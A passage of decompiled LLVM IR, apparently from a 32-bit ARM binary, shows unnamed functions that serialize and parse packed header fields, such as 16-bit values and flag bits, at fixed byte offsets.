  %v3_14550 = load i32, i32* @r4, align 4
  store i32 %v3_14550, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v7_14560 = icmp sgt i32 %arg3, 11
  br i1 %v7_14560, label %dec_label_pc_14564, label %dec_label_pc_1462c

dec_label_pc_14564:                               ; preds = %dec_label_pc_1454c
  %tmp18 = inttoptr i32 %arg2 to i8*
  %v1_14564 = add i32 %tmp, 1
  %v2_14564 = inttoptr i32 %v1_14564 to i8*
  %v3_14564 = load i8, i8* %v2_14564, align 1
  store i8 %v3_14564, i8* %tmp18, align 1
  %v2_1456c = load i32, i32* %arg1, align 4
  %v1_14570 = trunc i32 %v2_1456c to i8
  %v4_14570 = add i32 %arg2, 1
  %v5_14570 = inttoptr i32 %v4_14570 to i8*
  store i8 %v1_14570, i8* %v5_14570, align 1
  %v0_14574 = load i32, i32* %lr.global-to-local, align 4
  %v1_14574 = add i32 %v0_14574, 12
  %v2_14574 = inttoptr i32 %v1_14574 to i32*
  %v3_14574 = load i32, i32* %v2_14574, align 4
  %v1_14578 = add i32 %v0_14574, 4
  %v2_14578 = inttoptr i32 %v1_14578 to i32*
  %v3_14578 = load i32, i32* %v2_14578, align 4
  %v1_1457c = add i32 %v0_14574, 16
  %v2_1457c = inttoptr i32 %v1_1457c to i32*
  %v3_1457c = load i32, i32* %v2_1457c, align 4
  %v1_14580 = add i32 %tmp, 8
  %v2_14580 = inttoptr i32 %v1_14580 to i32*
  %v3_14580 = load i32, i32* %v2_14580, align 4
  %v2_14584 = icmp eq i32 %v3_14574, 0
  %. = select i1 %v2_14584, i32 0, i32 4
  %v2_14590 = icmp eq i32 %v3_14578, 0
  %v1_14594 = add i32 %v0_14574, 20
  %v2_14594 = inttoptr i32 %v1_14594 to i32*
  %v3_14594 = load i32, i32* %v2_14594, align 4
  %storemerge12 = select i1 %v2_14590, i32 0, i32 128
  %v1_145a0 = urem i32 %v3_14580, 16
  %v2_145a4 = icmp eq i32 %v3_1457c, 0
  %.29 = select i1 %v2_145a4, i32 0, i32 2
  %v4_145b0 = mul nuw nsw i32 %v1_145a0, 8
  %v5_145b0 = or i32 %v4_145b0, %.
  %v2_145b4 = icmp eq i32 %v3_14594, 0
  br i1 %v2_145b4, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_14564
  %v2_145b8 = or i32 %v5_145b0, 1
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_14564, %bb25
  %v1_145c0 = phi i32 [ %v5_145b0, %dec_label_pc_14564 ], [ %v2_145b8, %bb25 ]
  %v2_145bc = or i32 %.29, %storemerge12
  %v2_145c0 = or i32 %v2_145bc, %v1_145c0
  %v1_145c4 = trunc i32 %v2_145c0 to i8
  %v2_145c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_145c4 = add i32 %v2_145c4, 2
  %v4_145c4 = inttoptr i32 %v3_145c4 to i8*
  store i8 %v1_145c4, i8* %v4_145c4, align 1
  %v0_145c8 = load i32, i32* %lr.global-to-local, align 4
  %v1_145c8 = add i32 %v0_145c8, 24
  %v1_145cc = inttoptr i32 %v1_145c8 to i32*
  %v2_145cc = load i32, i32* %v1_145cc, align 4
  %v3_145cc = add i32 %v0_145c8, 28
  %v4_145cc = inttoptr i32 %v3_145cc to i32*
  %v5_145cc = load i32, i32* %v4_145cc, align 4
  %v2_145d0 = icmp eq i32 %v2_145cc, 0
  %v1_145d4 = urem i32 %v5_145cc, 16
  %.30 = select i1 %v2_145d0, i32 0, i32 128
  %v2_145e0 = or i32 %v1_145d4, %.30
  %v1_145e4 = trunc i32 %v2_145e0 to i8
  %v2_145e4 = load i32, i32* %r4.global-to-local, align 4
  %v3_145e4 = add i32 %v2_145e4, 3
  %v4_145e4 = inttoptr i32 %v3_145e4 to i8*
  store i8 %v1_145e4, i8* %v4_145e4, align 1
  %v0_145e8 = load i32, i32* %lr.global-to-local, align 4
  %v1_145e8 = add i32 %v0_145e8, 33
  %v2_145e8 = inttoptr i32 %v1_145e8 to i8*
  %v3_145e8 = load i8, i8* %v2_145e8, align 1
  %v2_145ec = load i32, i32* %r4.global-to-local, align 4
  %v3_145ec = add i32 %v2_145ec, 4
  %v4_145ec = inttoptr i32 %v3_145ec to i8*
  store i8 %v3_145e8, i8* %v4_145ec, align 1
  %v0_145f0 = load i32, i32* %lr.global-to-local, align 4
  %v1_145f0 = add i32 %v0_145f0, 32
  %v2_145f0 = inttoptr i32 %v1_145f0 to i32*
  %v3_145f0 = load i32, i32* %v2_145f0, align 4
  %v1_145f4 = trunc i32 %v3_145f0 to i8
  %v2_145f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_145f4 = add i32 %v2_145f4, 5
  %v4_145f4 = inttoptr i32 %v3_145f4 to i8*
  store i8 %v1_145f4, i8* %v4_145f4, align 1
  %v0_145f8 = load i32, i32* %lr.global-to-local, align 4
  %v1_145f8 = add i32 %v0_145f8, 37
  %v2_145f8 = inttoptr i32 %v1_145f8 to i8*
  %v3_145f8 = load i8, i8* %v2_145f8, align 1
  %v2_145fc = load i32, i32* %r4.global-to-local, align 4
  %v3_145fc = add i32 %v2_145fc, 6
  %v4_145fc = inttoptr i32 %v3_145fc to i8*
  store i8 %v3_145f8, i8* %v4_145fc, align 1
  %v0_14600 = load i32, i32* %lr.global-to-local, align 4
  %v1_14600 = add i32 %v0_14600, 36
  %v2_14600 = inttoptr i32 %v1_14600 to i32*
  %v3_14600 = load i32, i32* %v2_14600, align 4
  %v1_14604 = trunc i32 %v3_14600 to i8
  %v2_14604 = load i32, i32* %r4.global-to-local, align 4
  %v3_14604 = add i32 %v2_14604, 7
  %v4_14604 = inttoptr i32 %v3_14604 to i8*
  store i8 %v1_14604, i8* %v4_14604, align 1
  %v0_14608 = load i32, i32* %lr.global-to-local, align 4
  %v1_14608 = add i32 %v0_14608, 41
  %v2_14608 = inttoptr i32 %v1_14608 to i8*
  %v3_14608 = load i8, i8* %v2_14608, align 1
  %v2_1460c = load i32, i32* %r4.global-to-local, align 4
  %v3_1460c = add i32 %v2_1460c, 8
  %v4_1460c = inttoptr i32 %v3_1460c to i8*
  store i8 %v3_14608, i8* %v4_1460c, align 1
  %v0_14610 = load i32, i32* %lr.global-to-local, align 4
  %v1_14610 = add i32 %v0_14610, 40
  %v2_14610 = inttoptr i32 %v1_14610 to i32*
  %v3_14610 = load i32, i32* %v2_14610, align 4
  %v1_14614 = trunc i32 %v3_14610 to i8
  %v2_14614 = load i32, i32* %r4.global-to-local, align 4
  %v3_14614 = add i32 %v2_14614, 9
  %v4_14614 = inttoptr i32 %v3_14614 to i8*
  store i8 %v1_14614, i8* %v4_14614, align 1
  %v0_14618 = load i32, i32* %lr.global-to-local, align 4
  %v1_14618 = add i32 %v0_14618, 45
  %v2_14618 = inttoptr i32 %v1_14618 to i8*
  %v3_14618 = load i8, i8* %v2_14618, align 1
  %v2_1461c = load i32, i32* %r4.global-to-local, align 4
  %v3_1461c = add i32 %v2_1461c, 10
  %v4_1461c = inttoptr i32 %v3_1461c to i8*
  store i8 %v3_14618, i8* %v4_1461c, align 1
  %v0_14620 = load i32, i32* %lr.global-to-local, align 4
  %v1_14620 = add i32 %v0_14620, 44
  %v2_14620 = inttoptr i32 %v1_14620 to i32*
  %v3_14620 = load i32, i32* %v2_14620, align 4
  %v1_14624 = trunc i32 %v3_14620 to i8
  %v2_14624 = load i32, i32* %r4.global-to-local, align 4
  %v3_14624 = add i32 %v2_14624, 11
  %v4_14624 = inttoptr i32 %v3_14624 to i8*
  store i8 %v1_14624, i8* %v4_14624, align 1
  %v2_14630.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1462c

dec_label_pc_1462c:                               ; preds = %dec_label_pc_1454c, %bb26
  %v2_14630 = phi i32 [ %v3_14550, %dec_label_pc_1454c ], [ %v2_14630.pre, %bb26 ]
  %v0_1462c = phi i32 [ -1, %dec_label_pc_1454c ], [ 12, %bb26 ]
  store i32 %v2_14630, i32* @r4, align 4
  ret i32 %v0_1462c

; uselistorder directives
  uselistorder i32 %tmp, { 1, 2, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1462c, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @function_14634(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14634:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_14634 = load i8, i8* %arg1, align 1
  %v4_14634 = zext i8 %v3_14634 to i32
  %v2_14638 = add i32 %tmp, 1
  %v3_14638 = inttoptr i32 %v2_14638 to i8*
  %v4_14638 = load i8, i8* %v3_14638, align 1
  %v5_14638 = zext i8 %v4_14638 to i32
  %v4_1463c = mul nuw nsw i32 %v4_14634, 256
  %v5_1463c = or i32 %v5_14638, %v4_1463c
  %v2_14640 = inttoptr i32 %arg2 to i32*
  store i32 %v5_1463c, i32* %v2_14640, align 4
  %v2_14644 = add i32 %tmp, 2
  %v3_14644 = inttoptr i32 %v2_14644 to i8*
  %v4_14644 = load i8, i8* %v3_14644, align 1
  %tmp4 = icmp slt i8 %v4_14644, 0
  %v3_14648 = zext i1 %tmp4 to i32
  %v2_1464c = add i32 %arg2, 4
  %v3_1464c = inttoptr i32 %v2_1464c to i32*
  store i32 %v3_14648, i32* %v3_1464c, align 4
  %v4_14650 = load i8, i8* %v3_14644, align 1
  %div = udiv i8 %v4_14650, 8
  %tmp5 = urem i8 %div, 16
  %v1_14658 = zext i8 %tmp5 to i32
  %v2_1465c = add i32 %arg2, 8
  %v3_1465c = inttoptr i32 %v2_1465c to i32*
  store i32 %v1_14658, i32* %v3_1465c, align 4
  %v4_14660 = load i8, i8* %v3_14644, align 1
  %div1 = udiv i8 %v4_14660, 4
  %tmp6 = urem i8 %div1, 2
  %v1_14668 = zext i8 %tmp6 to i32
  %v2_1466c = add i32 %arg2, 12
  %v3_1466c = inttoptr i32 %v2_1466c to i32*
  store i32 %v1_14668, i32* %v3_1466c, align 4
  %v4_14670 = load i8, i8* %v3_14644, align 1
  %div2 = udiv i8 %v4_14670, 2
  %tmp7 = urem i8 %div2, 2
  %v1_14678 = zext i8 %tmp7 to i32
  %v2_1467c = add i32 %arg2, 16
  %v3_1467c = inttoptr i32 %v2_1467c to i32*
  store i32 %v1_14678, i32* %v3_1467c, align 4
  %v4_14680 = load i8, i8* %v3_14644, align 1
  %tmp8 = urem i8 %v4_14680, 2
  %v1_14684 = zext i8 %tmp8 to i32
  %v2_14688 = add i32 %arg2, 20
  %v3_14688 = inttoptr i32 %v2_14688 to i32*
  store i32 %v1_14684, i32* %v3_14688, align 4
  %v2_1468c = add i32 %tmp, 3
  %v3_1468c = inttoptr i32 %v2_1468c to i8*
  %v4_1468c = load i8, i8* %v3_1468c, align 1
  %tmp9 = icmp slt i8 %v4_1468c, 0
  %v3_14690 = zext i1 %tmp9 to i32
  %v2_14694 = add i32 %arg2, 24
  %v3_14694 = inttoptr i32 %v2_14694 to i32*
  store i32 %v3_14690, i32* %v3_14694, align 4
  %v4_14698 = load i8, i8* %v3_1468c, align 1
  %tmp10 = urem i8 %v4_14698, 16
  %v1_1469c = zext i8 %tmp10 to i32
  %v2_146a0 = add i32 %arg2, 28
  %v3_146a0 = inttoptr i32 %v2_146a0 to i32*
  store i32 %v1_1469c, i32* %v3_146a0, align 4
  %v2_146a4 = add i32 %tmp, 4
  %v3_146a4 = inttoptr i32 %v2_146a4 to i8*
  %v4_146a4 = load i8, i8* %v3_146a4, align 1
  %v5_146a4 = zext i8 %v4_146a4 to i32
  %v2_146a8 = add i32 %tmp, 5
  %v3_146a8 = inttoptr i32 %v2_146a8 to i8*
  %v4_146a8 = load i8, i8* %v3_146a8, align 1
  %v5_146a8 = zext i8 %v4_146a8 to i32
  %v4_146ac = mul nuw nsw i32 %v5_146a4, 256
  %v5_146ac = or i32 %v5_146a8, %v4_146ac
  %v2_146b0 = add i32 %arg2, 32
  %v3_146b0 = inttoptr i32 %v2_146b0 to i32*
  store i32 %v5_146ac, i32* %v3_146b0, align 4
  %v2_146b4 = add i32 %tmp, 6
  %v3_146b4 = inttoptr i32 %v2_146b4 to i8*
  %v4_146b4 = load i8, i8* %v3_146b4, align 1
  %v5_146b4 = zext i8 %v4_146b4 to i32
  %v2_146b8 = add i32 %tmp, 7
  %v3_146b8 = inttoptr i32 %v2_146b8 to i8*
  %v4_146b8 = load i8, i8* %v3_146b8, align 1
  %v5_146b8 = zext i8 %v4_146b8 to i32
  %v4_146bc = mul nuw nsw i32 %v5_146b4, 256
  %v5_146bc = or i32 %v5_146b8, %v4_146bc
  %v2_146c0 = add i32 %arg2, 36
  %v3_146c0 = inttoptr i32 %v2_146c0 to i32*
  store i32 %v5_146bc, i32* %v3_146c0, align 4
  %v2_146c4 = add i32 %tmp, 8
  %v3_146c4 = inttoptr i32 %v2_146c4 to i8*
  %v4_146c4 = load i8, i8* %v3_146c4, align 1
  %v5_146c4 = zext i8 %v4_146c4 to i32
  %v2_146c8 = add i32 %tmp, 9
  %v3_146c8 = inttoptr i32 %v2_146c8 to i8*
  %v4_146c8 = load i8, i8* %v3_146c8, align 1
  %v5_146c8 = zext i8 %v4_146c8 to i32
  %v4_146cc = mul nuw nsw i32 %v5_146c4, 256
  %v5_146cc = or i32 %v5_146c8, %v4_146cc
  %v2_146d0 = add i32 %arg2, 40
  %v3_146d0 = inttoptr i32 %v2_146d0 to i32*
  store i32 %v5_146cc, i32* %v3_146d0, align 4
  %v2_146d4 = add i32 %tmp, 11
  %v3_146d4 = inttoptr i32 %v2_146d4 to i8*
  %v4_146d4 = load i8, i8* %v3_146d4, align 1
  %v5_146d4 = zext i8 %v4_146d4 to i32
  %v2_146d8 = add i32 %tmp, 10
  %v3_146d8 = inttoptr i32 %v2_146d8 to i8*
  %v4_146d8 = load i8, i8* %v3_146d8, align 1
  %v5_146d8 = zext i8 %v4_146d8 to i32
  %v4_146e0 = mul nuw nsw i32 %v5_146d8, 256
  %v5_146e0 = or i32 %v4_146e0, %v5_146d4
  %v2_146e4 = add i32 %arg2, 44
  %v3_146e4 = inttoptr i32 %v2_146e4 to i32*
  store i32 %v5_146e0, i32* %v3_146e4, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 11, { 8, 9, 3, 4, 5, 6, 10, 1, 2, 11, 12, 13, 14, 15, 0, 7 }
  uselistorder i32 40, { 5, 6, 8, 7, 1, 14, 2, 0, 9, 10, 11, 12, 13, 4, 3 }
  uselistorder i32 28, { 10, 4, 5, 6, 27, 18, 31, 11, 13, 7, 12, 1, 19, 9, 2, 14, 28, 29, 15, 16, 20, 21, 22, 23, 24, 25, 0, 26, 8, 30, 3, 17 }
  uselistorder i8 2, { 0, 1, 2, 3, 8, 4, 5, 6, 7 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @function_146ec(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_146ec:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_146ec = load i32, i32* @r4, align 4
  store i32 %v3_146ec, i32* %stack_var_-16, align 4
  %v6_146ec = load i32, i32* @r5, align 4
  %v9_146ec = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_146f4 = load i32, i32* %arg1, align 4
  store i32 %v2_146f4, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_14700 = inttoptr i32 %v2_146f4 to i8*
  %v2_14700 = call i32 @function_14d60(i8* %v1_14700)
  store i32 %v2_14700, i32* %r0.global-to-local, align 4
  %v1_14704 = icmp slt i32 %v2_14700, 0
  br i1 %v1_14704, label %bb, label %bb6

bb:                                               ; preds = %dec_label_pc_146ec
  %v5_1470c = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_1470c, i32* @r4, align 4
  store i32 %v6_146ec, i32* @r5, align 4
  store i32 %v9_146ec, i32* @r6, align 4
  ret i32 %v2_14700

bb6:                                              ; preds = %dec_label_pc_146ec
  %v1_14708 = load i32, i32* @r4, align 4
  %v2_14708 = sub i32 %v1_14708, %v2_14700
  %v0_14714 = load i32, i32* @r6, align 4
  %v2_14714 = add i32 %v0_14714, %v2_14700
  store i32 %v2_14714, i32* %r2.global-to-local, align 4
  %v7_14718 = icmp sgt i32 %v2_14708, 3
  br i1 %v7_14718, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_1471c = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_1471c, i32* @r4, align 4
  store i32 %v6_146ec, i32* @r5, align 4
  store i32 %v9_146ec, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_14720 = load i32, i32* @r5, align 4
  %v1_14720 = add i32 %v0_14720, 5
  %v2_14720 = inttoptr i32 %v1_14720 to i8*
  %v3_14720 = load i8, i8* %v2_14720, align 1
  %v5_14724 = inttoptr i32 %v2_14714 to i8*
  store i8 %v3_14720, i8* %v5_14724, align 1
  %v0_14728 = load i32, i32* @r5, align 4
  %v1_14728 = add i32 %v0_14728, 4
  %v2_14728 = inttoptr i32 %v1_14728 to i32*
  %v3_14728 = load i32, i32* %v2_14728, align 4
  %v1_1472c = trunc i32 %v3_14728 to i8
  %v2_1472c = load i32, i32* %r2.global-to-local, align 4
  %v3_1472c = add i32 %v2_1472c, 1
  %v4_1472c = inttoptr i32 %v3_1472c to i8*
  store i8 %v1_1472c, i8* %v4_1472c, align 1
  %v0_14730 = load i32, i32* @r5, align 4
  %v1_14730 = add i32 %v0_14730, 9
  %v2_14730 = inttoptr i32 %v1_14730 to i8*
  %v3_14730 = load i8, i8* %v2_14730, align 1
  %v2_14734 = load i32, i32* %r2.global-to-local, align 4
  %v3_14734 = add i32 %v2_14734, 2
  %v4_14734 = inttoptr i32 %v3_14734 to i8*
  store i8 %v3_14730, i8* %v4_14734, align 1
  %v0_14738 = load i32, i32* @r5, align 4
  %v1_14738 = add i32 %v0_14738, 8
  %v2_14738 = inttoptr i32 %v1_14738 to i32*
  %v3_14738 = load i32, i32* %v2_14738, align 4
  %v0_1473c = load i32, i32* %r0.global-to-local, align 4
  %v1_1473c = add i32 %v0_1473c, 4
  store i32 %v1_1473c, i32* %r0.global-to-local, align 4
  %v1_14740 = trunc i32 %v3_14738 to i8
  %v2_14740 = load i32, i32* %r2.global-to-local, align 4
  %v3_14740 = add i32 %v2_14740, 3
  %v4_14740 = inttoptr i32 %v3_14740 to i8*
  store i8 %v1_14740, i8* %v4_14740, align 1
  %v2_14744 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14744, i32* @r4, align 4
  store i32 %v6_146ec, i32* @r5, align 4
  store i32 %v9_146ec, i32* @r6, align 4
  ret i32 %v1_1473c

; uselistorder directives
  uselistorder i32 %v2_14700, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_146ec, { 1, 0, 2 }
  uselistorder i32 %v6_146ec, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 0 }
}

define i32 @function_14748(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_14748:
  %v0_1474c = call i32 @function_14ed4()
  %v1_14750 = icmp slt i32 %v0_1474c, 0
  br i1 %v1_14750, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_14748
  %v4_14754 = add i32 %v0_1474c, 4
  br label %bb3

bb3:                                              ; preds = %dec_label_pc_14748, %bb
  %v5_14758 = phi i32 [ %v0_1474c, %dec_label_pc_14748 ], [ %v4_14754, %bb ]
  ret i32 %v5_14758

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @function_1475c(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
dec_label_pc_1475c:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_1475c = load i32, i32* @r4, align 4
  %v6_1475c = load i32, i32* @r5, align 4
  %v9_1475c = load i32, i32* @r6, align 4
  %v12_1475c = load i32, i32* @r7, align 4
  %v21_1475c = load i32, i32* @sl, align 4
  %v2_14760 = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_14760, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_1477c = call i32 @function_14e08()
  store i32 %v0_1477c, i32* %r0.global-to-local, align 4
  store i32 %v0_1477c, i32* @r7, align 4
  %v1_14780 = icmp slt i32 %v0_1477c, 0
  %v0_14784 = load i32, i32* @r4, align 4
  %v2_14784 = add i32 %v0_14784, %v0_1477c
  store i32 %v2_14784, i32* %r8.global-to-local, align 4
  br i1 %v1_14780, label %bb14, label %dec_label_pc_14794

dec_label_pc_14794:                               ; preds = %dec_label_pc_1475c
  %v1_1478c = load i32, i32* @r5, align 4
  %v2_1478c = sub i32 %v1_1478c, %v2_14784
  %v1_14794 = add i32 %v2_1478c, -10
  store i32 %v1_14794, i32* @r5, align 4
  %v6_14794 = icmp slt i32 %v1_14794, 0
  store i32 %v2_14760, i32* %r0.global-to-local, align 4
  %v0_1479c = load i32, i32* @sl, align 4
  %v2_1479c = add i32 %v0_1479c, %v2_14784
  store i32 %v2_1479c, i32* @r4, align 4
  br i1 %v6_14794, label %bb, label %dec_label_pc_147a8

bb:                                               ; preds = %dec_label_pc_14794
  br label %bb14

dec_label_pc_147a8:                               ; preds = %dec_label_pc_14794
  %v1_147a8 = call i32 @function_f4e0(i32 %v2_14760)
  store i32 %v1_147a8, i32* %r0.global-to-local, align 4
  %v1_147ac = load i32, i32* @r6, align 4
  %v2_147ac = inttoptr i32 %v1_147ac to i32*
  store i32 %v1_147a8, i32* %v2_147ac, align 4
  %v0_147b0 = load i32, i32* @sl, align 4
  %v1_147b0 = load i32, i32* %r8.global-to-local, align 4
  %v2_147b0 = add i32 %v1_147b0, %v0_147b0
  %v3_147b0 = inttoptr i32 %v2_147b0 to i8*
  %v4_147b0 = load i8, i8* %v3_147b0, align 1
  %v6_147b0 = zext i8 %v4_147b0 to i32
  %v0_147b4 = load i32, i32* @r4, align 4
  %v1_147b4 = add i32 %v0_147b4, 1
  %v2_147b4 = inttoptr i32 %v1_147b4 to i8*
  %v3_147b4 = load i8, i8* %v2_147b4, align 1
  %v4_147b4 = zext i8 %v3_147b4 to i32
  %v4_147b8 = mul nuw nsw i32 %v6_147b0, 256
  %v5_147b8 = or i32 %v4_147b4, %v4_147b8
  store i32 %v5_147b8, i32* %r3.global-to-local, align 4
  %v1_147bc = load i32, i32* @r6, align 4
  %v2_147bc = add i32 %v1_147bc, 4
  %v3_147bc = inttoptr i32 %v2_147bc to i32*
  store i32 %v5_147b8, i32* %v3_147bc, align 4
  %v0_147c0 = load i32, i32* @r4, align 4
  %v1_147c0 = add i32 %v0_147c0, 2
  store i32 %v1_147c0, i32* %r1.global-to-local, align 4
  %v2_147c4 = inttoptr i32 %v1_147c0 to i8*
  %v3_147c4 = load i8, i8* %v2_147c4, align 1
  %v4_147c4 = zext i8 %v3_147c4 to i32
  %v1_147c8 = add i32 %v0_147c0, 3
  %v2_147c8 = inttoptr i32 %v1_147c8 to i8*
  %v3_147c8 = load i8, i8* %v2_147c8, align 1
  %v4_147c8 = zext i8 %v3_147c8 to i32
  %v4_147cc = mul nuw nsw i32 %v4_147c4, 256
  %v5_147cc = or i32 %v4_147c8, %v4_147cc
  store i32 %v5_147cc, i32* %r3.global-to-local, align 4
  %v1_147d0 = load i32, i32* @r6, align 4
  %v2_147d0 = add i32 %v1_147d0, 8
  %v3_147d0 = inttoptr i32 %v2_147d0 to i32*
  store i32 %v5_147cc, i32* %v3_147d0, align 4
  %v0_147d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_147d4 = add i32 %v0_147d4, 2
  %v1_147d8 = add i32 %v0_147d4, 3
  %v2_147d8 = inttoptr i32 %v1_147d8 to i8*
  %v3_147d8 = load i8, i8* %v2_147d8, align 1
  %v4_147d8 = zext i8 %v3_147d8 to i32
  store i32 %v4_147d8, i32* %r3.global-to-local, align 4
  %v2_147dc = inttoptr i32 %v1_147d4 to i8*
  %v3_147dc = load i8, i8* %v2_147dc, align 1
  %v4_147dc = zext i8 %v3_147dc to i32
  store i32 %v4_147dc, i32* %r0.global-to-local, align 4
  %v1_147e0 = add i32 %v0_147d4, 5
  %v2_147e0 = inttoptr i32 %v1_147e0 to i8*
  %v3_147e0 = load i8, i8* %v2_147e0, align 1
  %v4_147e0 = zext i8 %v3_147e0 to i32
  %v3_147e4 = mul nuw nsw i32 %v4_147d8, 65536
  store i32 %v3_147e4, i32* %r3.global-to-local, align 4
  %v1_147e8 = add i32 %v0_147d4, 4
  %v2_147e8 = inttoptr i32 %v1_147e8 to i8*
  %v3_147e8 = load i8, i8* %v2_147e8, align 1
  %v4_147e8 = zext i8 %v3_147e8 to i32
  %v4_147ec = mul nuw i32 %v4_147dc, 16777216
  %v5_147ec = or i32 %v4_147ec, %v3_147e4
  %v2_147f0 = or i32 %v5_147ec, %v4_147e0
  %v4_147f4 = mul nuw nsw i32 %v4_147e8, 256
  %v5_147f4 = or i32 %v2_147f0, %v4_147f4
  store i32 %v5_147f4, i32* %r3.global-to-local, align 4
  %v1_147f8 = load i32, i32* @r6, align 4
  %v2_147f8 = add i32 %v1_147f8, 12
  %v3_147f8 = inttoptr i32 %v2_147f8 to i32*
  store i32 %v5_147f4, i32* %v3_147f8, align 4
  %v0_147fc = load i32, i32* %r1.global-to-local, align 4
  %v1_147fc = add i32 %v0_147fc, 6
  %v2_147fc = inttoptr i32 %v1_147fc to i8*
  %v3_147fc = load i8, i8* %v2_147fc, align 1
  %v4_147fc = zext i8 %v3_147fc to i32
  %v0_14800 = load i32, i32* @r4, align 4
  %v1_14800 = add i32 %v0_14800, 9
  %v2_14800 = inttoptr i32 %v1_14800 to i8*
  %v3_14800 = load i8, i8* %v2_14800, align 1
  %v4_14800 = zext i8 %v3_14800 to i32
  %v1_14804 = add i32 %v0_14800, 10
  store i32 %v1_14804, i32* %r0.global-to-local, align 4
  %v4_14808 = mul nuw nsw i32 %v4_147fc, 256
  %v5_14808 = or i32 %v4_14800, %v4_14808
  store i32 %v5_14808, i32* %r3.global-to-local, align 4
  %v0_1480c = load i32, i32* %r8.global-to-local, align 4
  %v1_1480c = add i32 %v0_1480c, 10
  %v0_14810 = load i32, i32* @r5, align 4
  %v1_14814 = add nuw nsw i32 %v5_14808, 10
  store i32 %v1_14814, i32* %r1.global-to-local, align 4
  %v1_14818 = load i32, i32* @r6, align 4
  %v2_14818 = add i32 %v1_14818, 24
  %v3_14818 = inttoptr i32 %v2_14818 to i32*
  store i32 %v1_1480c, i32* %v3_14818, align 4
  %v0_1481c = load i32, i32* %r0.global-to-local, align 4
  %v1_1481c = load i32, i32* @r6, align 4
  %v2_1481c = add i32 %v1_1481c, 20
  %v3_1481c = inttoptr i32 %v2_1481c to i32*
  store i32 %v0_1481c, i32* %v3_1481c, align 4
  %v0_14820 = load i32, i32* %r3.global-to-local, align 4
  %v1_14820 = load i32, i32* @r6, align 4
  %v2_14820 = add i32 %v1_14820, 16
  %v3_14820 = inttoptr i32 %v2_14820 to i32*
  store i32 %v0_14820, i32* %v3_14820, align 4
  %v0_14824 = load i32, i32* @r7, align 4
  %v1_14824 = load i32, i32* %r1.global-to-local, align 4
  %v2_14824 = add i32 %v1_14824, %v0_14824
  %v5_14828 = icmp slt i32 %v0_14810, %v5_14808
  %.v2_14824 = select i1 %v5_14828, i32 -1, i32 %v2_14824
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_147a8, %dec_label_pc_1475c
  %v0_1482c = phi i32 [ %.v2_14824, %dec_label_pc_147a8 ], [ %v1_14794, %bb ], [ %v0_1477c, %dec_label_pc_1475c ]
  store i32 %v0_1482c, i32* %r0.global-to-local, align 4
  store i32 %v3_1475c, i32* @r4, align 4
  store i32 %v6_1475c, i32* @r5, align 4
  store i32 %v9_1475c, i32* @r6, align 4
  store i32 %v12_1475c, i32* @r7, align 4
  store i32 %v21_1475c, i32* @sl, align 4
  ret i32 %v0_1482c

; uselistorder directives
  uselistorder i32 %v0_1482c, { 1, 0 }
  uselistorder i32 %v5_14808, { 1, 0, 2 }
  uselistorder i32 %v3_147e4, { 1, 0 }
  uselistorder i32 %v1_14794, { 0, 2, 1 }
  uselistorder i32 %v0_1477c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
